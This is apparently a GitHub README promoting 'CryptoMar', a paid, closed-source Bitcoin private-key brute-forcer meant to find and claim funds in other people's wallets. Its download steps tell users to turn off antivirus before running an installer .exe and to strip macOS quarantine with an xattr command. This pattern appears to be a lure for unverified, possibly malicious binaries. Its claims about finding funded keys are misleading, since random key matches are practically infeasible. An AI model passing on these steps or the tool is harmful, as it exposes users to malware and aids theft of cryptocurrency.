# CryptoMar

CryptoMar is a high-performance Bitcoin wallet brute-force tool based on a custom C++ library, optimized for macOS and Windows. The program supports the generation and search of private keys and Bech32 (P2WPKH) Bitcoin addresses at high speed, featuring a user-friendly interface aimed at regular users.

```bash
 _____________________________________________________________________
|============================ Welcome to =============================|
|                              ᴄʀʏᴘᴛᴏᴍᴀʀ                              |
|============================ Version 1.0 ============================|
|                                                                     |
|  Rate: 1 BTC = 103293 USD. (2025-05-18 00:00:11)                    |
|  Setup completed.                                                   |
|  Please wait, the process will start soon...                        |
|-------------------- Loading addresses into memory ------------------|
|  Loaded 18226528 addresses.                                         |
|---------------------------------------------------------------------|
|============================ In Progress ============================|
|                              ᴄʀʏᴘᴛᴏᴍᴀʀ                              |
|============================ Version 1.0 ============================|
|  The key search process is not fast.                                |
|  It can take days or even weeks.                                    |
|  It all depends on your processor's power and luck.                 |
|_____________________________________________________________________|
|                                                                     |
| 788681.99 addresses/s            Total: 5667243744                  |
```

## 🚀 Features

* Lightning-fast Bitcoin address generation using a native C++ library.
* Support for Bech32 (P2WPKH) Bitcoin addresses.
* Multi-threaded generation and verification with minimal memory usage.
* An up-to-date database of all existing P2WPKH addresses with balances, current as of early May 2025.


## 🔓 How It Works

### 🗝️ Private and Public Key Generation

* The program randomly generates a 256-bit number, which becomes the private key.
* A public key is created from the private key using elliptic curve cryptography (secp256k1).
* The public key is hashed twice (SHA-256 and RIPEMD-160) to create a Public Key Hash, which is then used to generate the Bech32 (P2WPKH) address.

### 🚀 How Wallet Brute-Forcing Works

* The program generates millions of private keys and corresponding Bech32 addresses.
* Each address is checked for a balance in a database of known addresses with confirmed balances.
* If an address with a balance is found, the private key is saved and the user is notified.


## 🌐 How Many Wallets with Balances?

As of early May 2025, the program's database contains **18226528** Bech32 (P2WPKH) addresses** with confirmed balances > 0.00001 BTC.


## ❓ Why Is the Author Sharing This Program?

Brute-forcing private keys is a matter of substantial time and computational power. The author created this software to distribute the process among a large number of people. The user who finds the correct key receives 90% of the funds, while the author receives 10%.


## 📥 Download and Launch

### 🪟 For Windows

1. Turn off the antivirus.
2. Open the latest release: [CryptoMar Releases](https://github.com/HexaMar/CryptoMar_EN/releases/tag/v1.1.0)
3. Download the file `CryptoMarInstaller.exe`
4. Follow the installer instructions.

### 🍎 For macOS

1. Open the latest release: [CryptoMar Releases](https://github.com/HexaMar/CryptoMar_EN/releases/tag/v1.1.0)
2. Download the file `CryptoMarAPP.zip`
3. Open the file `CryptoMarAPP.zip` in Download folder
4. Open the terminal, enter the following, and press Enter:
   ```bash
   xattr -rd com.apple.quarantine ~/Downloads/CryptoMar.app
   ```
5. Launch the program `CryptoMar.app`

## ⚡ Paid and Free Versions

* **Free Version:** Limited speed and runtime (up to 100 hours).
* **Paid Version:** Unlimited speed and runtime.

If the program exits without finding the file, ensure all required files are in the same folder.


## 💡 Support

For support, contact the developer or create an issue on GitHub.
Before using, please review the [Terms of Use](https://github.com/HexaMar/CryptoMar_EN/blob/main/README.txt)
